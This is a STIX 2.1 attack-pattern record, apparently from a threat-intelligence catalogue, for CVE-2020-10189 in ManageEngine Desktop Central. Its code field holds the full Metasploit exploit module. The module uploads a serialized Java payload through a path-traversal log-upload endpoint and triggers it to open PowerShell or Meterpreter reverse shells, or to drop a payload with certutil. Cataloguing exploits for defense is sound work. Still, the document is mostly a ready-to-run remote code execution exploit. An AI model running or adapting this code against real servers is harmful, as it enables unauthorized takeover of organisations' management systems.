{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ae8720ef-9cfe-409b-b2ad-18da05a47f86",
    "created": "2024-08-14T16:52:04.072747Z",
    "modified": "2024-08-14T16:52:04.072751Z",
    "name": "ManageEngine Desktop Central Java Deserialization",
    "description": " This module exploits a Java deserialization vulnerability in the getChartImage() method from the FileStorage class within ManageEngine Desktop Central versions < 10.0.474. Tested against 10.0.465 x64.  Quoting the vendor's advisory on fixed versions:  \"The short-term fix for the arbitrary file upload vulnerability was released in build 10.0.474 on January 20, 2020. In continuation of that, the complete fix for the remote code execution vulnerability is now available in build 10.0.479.\" ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/desktopcentral_deserialization.rb",
            "external_id": "desktopcentral_deserialization.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-10189"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/advisories/src-2020-0011/"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/pocs/src-2020-0011.py.txt"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/steventseeley/status/1235635108498948096"
        },
        {
            "source_name": "reference",
            "url": "https://www.manageengine.com/products/desktop-central/remote-code-execution-vulnerability.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = GreatRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::JavaDeserialization\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine Desktop Central Java Deserialization',\n        'Description' => %q{\n          This module exploits a Java deserialization vulnerability in the\n          getChartImage() method from the FileStorage class within ManageEngine\n          Desktop Central versions < 10.0.474. Tested against 10.0.465 x64.\n\n          Quoting the vendor's advisory on fixed versions:\n\n          \"The short-term fix for the arbitrary file upload vulnerability was\n          released in build 10.0.474 on January 20, 2020. In continuation of\n          that, the complete fix for the remote code execution vulnerability is\n          now available in build 10.0.479.\"\n        },\n        'Author' => [\n          'mr_me', # Discovery and exploit\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-10189'],\n          ['URL', 'https://srcincite.io/advisories/src-2020-0011/'],\n          ['URL', 'https://srcincite.io/pocs/src-2020-0011.py.txt'],\n          ['URL', 'https://twitter.com/steventseeley/status/1235635108498948096'],\n          ['URL', 'https://www.manageengine.com/products/desktop-central/remote-code-execution-vulnerability.html']\n        ],\n        'DisclosureDate' => '2020-03-05', # 0day release\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'CmdStagerFlavor' => :certutil, # This works without issue\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'PowerShell Stager',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :psh_stager,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 2,\n        'DefaultOptions' => {\n          'SSL' => true,\n          'WfsDelay' => 60 # It can take a little while to trigger\n        },\n        'Notes' => {\n          'Stability' => [SERVICE_RESOURCE_LOSS], # May 404 the upload page?\n          'Reliability' => [FIRST_ATTEMPT_FAIL], # Payload upload may fail\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8383),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'configurations.do')\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    unless res.code == 200 && res.body.include?('ManageEngine Desktop Central')\n      return CheckCode::Unknown('Target is not running Desktop Central.')\n    end\n\n    build = res.get_html_document.at('//input[@id = \"buildNum\"]/@value')&.text\n\n    unless build&.match(/\\d+/)\n      return CheckCode::Detected(\n        'Target did not respond with Desktop Central build.'\n      )\n    end\n\n    # Desktop Central build 100474 is equivalent to version 10.0.474\n    if build.to_i < 100474\n      return CheckCode::Appears(\n        \"Desktop Central #{build} is a vulnerable build.\"\n      )\n    end\n\n    CheckCode::Safe(\"Desktop Central #{build} is NOT a vulnerable build.\")\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :win_cmd\n      execute_command(payload.encoded)\n    when :win_dropper\n      execute_cmdstager\n    when :psh_stager\n      execute_command(cmd_psh_payload(\n        payload.encoded,\n        payload.arch.first,\n        remove_comspec: true\n      ))\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    # I identified mr_me's binary blob as the CommonsBeanutils1 payload :)\n    java_payload = generate_java_deserialization_for_command(\n      'CommonsBeanutils1',\n      'cmd',\n      cmd\n    )\n\n    # XXX: Patch in expected serialVersionUID\n    java_payload[140, 8] = \"\\xcf\\x8e\\x01\\x82\\xfe\\x4e\\xf1\\x7e\"\n\n    # Rock 'n' roll!\n    upload_serialized_payload(java_payload)\n    deserialize_payload\n  end\n\n  def upload_serialized_payload(serialized_payload)\n    print_status('Uploading serialized payload')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/mdm/client/v1/mdmLogUploader'),\n      'ctype' => 'application/octet-stream',\n      'vars_get' => {\n        # Traversal from C:\\Program Files\\DesktopCentral_Server\\mdm-logs\\foo\\bar\n        'udid' => '\\\\..\\\\..\\\\..\\\\webapps\\\\DesktopCentral\\\\_chart',\n        'filename' => 'logger.zip'\n      },\n      'data' => serialized_payload\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, 'Could not upload serialized payload')\n    end\n\n    print_good('Successfully uploaded serialized payload')\n\n    # Shell lands in C:\\Program Files\\DesktopCentral_Server\\bin\n    register_file_for_cleanup('..\\\\webapps\\\\DesktopCentral\\\\_chart\\\\logger.zip')\n  end\n\n  def deserialize_payload\n    print_status('Deserializing payload')\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'cewolf'),\n      'vars_get' => {\n        'img' => '\\\\logger.zip'\n      }\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, 'Could not deserialize payload')\n    end\n\n    print_good('Successfully deserialized payload')\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-03-05, # 0day release",
    "x_mitre_platforms": [
        "win'"
    ]
}